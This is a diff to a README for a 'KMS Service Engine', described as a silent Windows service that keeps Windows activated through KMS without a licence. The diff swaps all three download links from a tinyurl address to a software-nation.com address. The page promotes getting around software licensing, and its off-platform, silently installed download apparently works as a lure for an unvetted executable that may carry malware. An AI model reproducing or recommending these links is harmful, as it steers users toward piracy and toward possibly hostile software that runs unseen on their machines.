@@ -9,7 +9,7 @@ The **🔄 KMS Service Engine** is a lightweight Windows service that runs silen
 
 <div align="center">
 
-[![Download KMS Service Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-service-engine)
+[![Download KMS Service Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-service-engine)
 
 </div>
 
@@ -96,7 +96,7 @@ KMS activation lasts only 180 days. Most people forget to re-activate. Then one 
 4. **✅ Click "Install Service"**
 5. **🚀 Service starts automatically** — no further action needed
 
-[![Download KMS Service Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-service-engine)
+[![Download KMS Service Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-service-engine)
 
 ### Installation Interface
 
@@ -273,7 +273,7 @@ Install once. Activate forever. **KMS Service Engine** runs silently in the back
 
 <div align="center">
 
-[![Download KMS Service Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/kms-service-engine)
+[![Download KMS Service Engine](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/kms-service-engine)
 
 **Version 3.3.0** — Silent background service. Free forever.
 
